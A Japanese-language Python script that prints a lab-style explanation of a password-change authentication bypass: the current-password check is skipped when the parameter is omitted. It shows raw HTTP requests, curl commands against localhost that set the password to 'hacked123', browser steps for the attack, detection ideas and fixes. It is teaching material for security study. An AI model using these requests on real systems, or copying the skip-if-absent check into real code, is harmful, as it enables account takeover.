#!/usr/bin/env python3
"""
パスワード変更脆弱性テスト

脆弱性:
- current_passwordパラメータを送信しない場合、現在のパスワード確認をスキップ
- パラメータの存在チェックのみで、認証バイパスが可能

攻撃例:
正常: current_password=old&new_password=new&confirm_password=new
脆弱: new_password=new&confirm_password=new (current_passwordパラメータなし)
"""

def print_vulnerability_info():
    """脆弱性の詳細説明"""
    print("🔒 パスワード変更認証バイパス脆弱性")
    print("=" * 40)
    
    print("\n📝 脆弱性の概要:")
    print("- current_passwordパラメータが存在しない場合、現在のパスワード確認をスキップ")
    print("- パラメータの存在チェックのみで認証処理を決定")
    print("- 攻撃者は現在のパスワードを知らなくても変更可能")
    
    print("\n🎯 脆弱なコード:")
    print("```python")
    print("skip_current_password_check = 'current_password' not in request.form")
    print("if not skip_current_password_check:")
    print("    # 現在のパスワード確認処理")
    print("else:")
    print("    # 確認をスキップ")
    print("```")
    
    print("\n💥 攻撃シナリオ:")
    print("1. ログイン済みのセッションを取得（XSSやセッション固定攻撃など）")
    print("2. パスワード変更リクエストを送信（current_passwordパラメータなし）")
    print("3. 現在のパスワードを知らずにパスワード変更成功")

def print_test_examples():
    """テスト例"""
    print("\n🔬 テスト例:")
    print("=" * 15)
    
    print("\n### 正常なリクエスト（現在のパスワード確認あり）")
    print("```")
    print("POST /user/password/change HTTP/1.1")
    print("Content-Type: application/x-www-form-urlencoded")
    print("")
    print("current_password=admin123&new_password=newpass123&confirm_password=newpass123")
    print("```")
    print("結果: 現在のパスワードが正しければ変更成功")
    
    print("\n### 脆弱なリクエスト（認証バイパス）")
    print("```")
    print("POST /user/password/change HTTP/1.1")
    print("Content-Type: application/x-www-form-urlencoded")
    print("")
    print("new_password=newpass123&confirm_password=newpass123")
    print("```")
    print("結果: current_passwordパラメータがないため確認をスキップ、変更成功")
    
    print("\n### 別の攻撃例（空のcurrent_password）")
    print("```")
    print("POST /user/password/change HTTP/1.1")
    print("Content-Type: application/x-www-form-urlencoded")
    print("")
    print("current_password=&new_password=newpass123&confirm_password=newpass123")
    print("```")
    print("結果: パラメータは存在するが空なので、通常の認証処理が実行される")

def print_curl_examples():
    """cURLコマンド例"""
    print("\n📋 cURLテスト例:")
    print("=" * 20)
    
    print("\n### 1. 正常なパスワード変更")
    print("```bash")
    print("curl -X POST http://localhost:5000/user/password/change \\")
    print('  -H "Content-Type: application/x-www-form-urlencoded" \\')
    print('  -H "Cookie: session=YOUR_SESSION_COOKIE" \\')
    print('  --data-urlencode "current_password=admin123" \\')
    print('  --data-urlencode "new_password=newpass123" \\')
    print('  --data-urlencode "confirm_password=newpass123"')
    print("```")
    
    print("\n### 2. 認証バイパス攻撃")
    print("```bash")
    print("curl -X POST http://localhost:5000/user/password/change \\")
    print('  -H "Content-Type: application/x-www-form-urlencoded" \\')
    print('  -H "Cookie: session=YOUR_SESSION_COOKIE" \\')
    print('  --data-urlencode "new_password=hacked123" \\')
    print('  --data-urlencode "confirm_password=hacked123"')
    print("```")
    print("⚠️  current_passwordパラメータが存在しないため認証をバイパス")
    
    print("\n### 3. URLエンコード形式での攻撃")
    print("```bash")
    print("curl -X POST http://localhost:5000/user/password/change \\")
    print('  -H "Content-Type: application/x-www-form-urlencoded" \\')
    print('  -H "Cookie: session=YOUR_SESSION_COOKIE" \\')
    print('  -d "new_password=hacked123&confirm_password=hacked123"')
    print("```")

def print_test_procedure():
    """テスト手順"""
    print("\n🔬 テスト手順:")
    print("=" * 15)
    
    print("\n1. サーバー起動:")
    print("   python run.py")
    
    print("\n2. ブラウザでログイン:")
    print("   http://localhost:5000/login")
    print("   ユーザー名: admin")
    print("   パスワード: admin123")
    
    print("\n3. パスワード変更ページにアクセス:")
    print("   http://localhost:5000/user/password/change")
    
    print("\n4. ブラウザの開発者ツールでリクエストを編集:")
    print("   a. ネットワークタブを開く")
    print("   b. フォームに適当な値を入力して送信")
    print("   c. POSTリクエストを右クリック → Edit and Resend")
    print("   d. current_passwordパラメータを削除")
    print("   e. リクエスト送信")
    
    print("\n5. 結果確認:")
    print("   a. 'パスワードを変更しました' 成功メッセージ")
    print("   b. 新しいパスワードでログインできることを確認")
    print("   c. エラーメッセージなし（静かに認証バイパス）")

def print_detection_methods():
    """検出方法"""
    print("\n🔍 検出方法:")
    print("=" * 15)
    
    print("\n### ログ分析")
    print("- パスワード変更リクエストでcurrent_passwordパラメータが欠如")
    print("- エラーメッセージなしでのパスワード変更成功")
    print("- 短時間での複数パスワード変更")
    
    print("\n### セキュリティテスト")
    print("- パラメータ削除攻撃のテスト")
    print("- 認証バイパスの確認")
    print("- セッションハイジャック後の権限昇格テスト")

def print_countermeasures():
    """対策方法"""
    print("\n🛡️ 対策方法:")
    print("=" * 15)
    
    print("\n### 1. 必須パラメータの強制")
    print("```python")
    print("if not current_password:")
    print("    flash('現在のパスワードは必須です', 'error')")
    print("    return redirect('/user/password/change')")
    print("```")
    
    print("\n### 2. 常に現在のパスワード確認")
    print("```python")
    print("# パラメータの存在に関係なく、常に確認")
    print("user_data = get_user_by_id(user_id)")
    print("if not verify_password(current_password, user_data.password):")
    print("    flash('現在のパスワードが正しくありません', 'error')")
    print("    return redirect('/user/password/change')")
    print("```")
    
    print("\n### 3. 多要素認証の実装")
    print("- パスワード変更時のメール認証")
    print("- SMS認証")
    print("- TOTP（時間ベースワンタイムパスワード）")

if __name__ == "__main__":
    print_vulnerability_info()
    print_test_examples()
    print_curl_examples()
    print_test_procedure()
    print_detection_methods()
    print_countermeasures()
    
    print("\n" + "=" * 50)
    print("📖 この脆弱性は教育目的で作成されています")
    print("🔒 実際のアプリケーションでは適切な認証を実装してください")